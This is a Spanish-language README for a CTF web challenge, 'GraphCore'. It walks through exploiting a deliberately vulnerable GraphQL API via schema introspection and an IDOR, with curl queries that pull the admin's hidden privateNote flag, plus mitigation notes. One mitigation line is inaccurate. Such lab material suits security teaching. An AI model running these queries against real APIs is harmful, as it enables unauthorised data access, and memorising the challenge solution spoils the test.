# GraphCore — hard-api-graphql

| Campo       | Valor                          |
|-------------|-------------------------------|
| ID          | api-hard-graphql              |
| Nombre      | GraphCore                     |
| Categoría   | api                           |
| Dificultad  | hard                          |
| Puerto      | 80 (host: 8080 por defecto)   |
| Timeout     | 3600 s                        |

---

## Descripción

Una plataforma interna expone su API de usuarios a través de GraphQL. La documentación publicada solo muestra `id`, `username` y `email`. Sin embargo, el esquema GraphQL revela más de lo que los desarrolladores pretendían.

El usuario administrador (id=1) tiene un campo `privateNote` que contiene la FLAG. No existe autenticación — el IDOR es la vulnerabilidad en sí.

---

## Vulnerabilidad

**GraphQL Introspection + IDOR**

GraphQL por defecto tiene habilitado el mecanismo de introspección, que permite a cualquier cliente consultar el esquema completo de la API: tipos, campos, argumentos y relaciones. En esta aplicación:

1. El tipo `UserType` declara el campo `privateNote` pero no aparece en los ejemplos de documentación.
2. Cualquier cliente puede usar `__schema` para descubrir todos los campos de todos los tipos.
3. No hay control de acceso en el resolver del campo `privateNote`.
4. El usuario con `id=1` (admin) tiene `privateNote` = FLAG.

---

## Pasos del ataque

### Paso 1 — Reconocimiento básico

Listar los usuarios disponibles para confirmar el funcionamiento de la API:

```bash
curl -s -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id username email } }"}'
```

Respuesta esperada:
```json
{
  "data": {
    "users": [
      {"id": 1, "username": "admin", "email": "admin@corp.internal"},
      {"id": 2, "username": "alice", "email": "alice@corp.com"},
      {"id": 3, "username": "bob",   "email": "bob@corp.com"}
    ]
  }
}
```

### Paso 2 — Introspección del esquema

Consultar el esquema completo para descubrir campos ocultos:

```bash
curl -s -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
```

En la respuesta, buscar el tipo `UserType`:
```json
{
  "name": "UserType",
  "fields": [
    {"name": "id"},
    {"name": "username"},
    {"name": "email"},
    {"name": "privateNote"}   <-- campo no documentado
  ]
}
```

### Paso 3 — IDOR: extraer la nota privada del admin

Con el campo descubierto, consultar el usuario id=1:

```bash
curl -s -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id username email privateNote } }"}'
```

Respuesta:
```json
{
  "data": {
    "user": {
      "id": 1,
      "username": "admin",
      "email": "admin@corp.internal",
      "privateNote": "CTF{...FLAG...}"
    }
  }
}
```

---

## Script de solución automatizado

```bash
python solve.py localhost 8080
```

El script realiza los tres pasos automáticamente y extrae la FLAG.

---

## Cómo ejecutar el reto

```bash
# Con Docker Compose
FLAG="CTF{test_flag_123}" docker-compose up --build

# Acceder en
http://localhost:8080
```

---

## Mitigación (para referencia educativa)

- Deshabilitar introspección en producción: `graphene.Schema(query=Query, auto_camelcase=False)` + middleware de bloqueo.
- Aplicar control de acceso por campo en los resolvers (verificar identidad del usuario solicitante).
- No almacenar datos sensibles en campos accesibles sin autenticación.
